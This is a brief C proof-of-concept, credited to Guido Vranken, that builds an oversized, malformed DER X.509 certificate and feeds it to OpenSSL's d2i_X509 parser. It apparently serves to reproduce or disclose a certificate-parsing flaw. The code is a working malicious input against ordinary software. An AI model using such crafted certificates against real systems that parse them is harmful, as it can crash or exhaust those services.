/* By Guido Vranken */
/* guidovranken at gmail com */

#include <openssl/x509.h>
#include <stdlib.h>
#include <string.h>

const unsigned char data_header[] = {
  0x30, 0x80, 0x30, 0x80, 0x02, 0x02, 0x4a, 0x30, 0x30, 0x80, 0x06, 0x01,
  0x30, 0x00, 0x00, 0x30, 0x80, 0x31, 0x80
};
const unsigned char data_middle[] = {
  0x30, 0x80, 0x06, 0x01, 0x01, 0x0c, 0x00, 0x00, 0x00
};
const unsigned char data_footer[] = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

#define X509_NAME_MAX (1024 * 1024)
#define ADD_DATA(X) { memcpy(data + offset, (X), sizeof((X))); offset += sizeof((X)); }
int main(void)
{
    size_t i, N;
    size_t offset;
    size_t totalsize;
    unsigned char* data;

    totalsize = 0;
    totalsize += sizeof(data_header);
    totalsize += sizeof(data_footer);

    /* Calculate max amount of middle parts that fit in X509_NAME_MAX */
    N = (X509_NAME_MAX-totalsize)/sizeof(data_middle);
    /* And then some */
    N += 2;
    totalsize += sizeof(data_middle)*N;

    data = malloc(totalsize);

    if ( data == NULL ) { return 0; }

    /* Fill buffer */
    offset = 0;
    ADD_DATA(data_header);
    for (i = 0; i < N; i++) {
        ADD_DATA(data_middle);
    }
    ADD_DATA(data_footer);

    {
        const unsigned char* p = data;
        X509 *x509 = d2i_X509(NULL, &p, totalsize);
        if (x509 != NULL) {
            X509_free(x509);
        }
    }

    free(data);
    return 0;
}
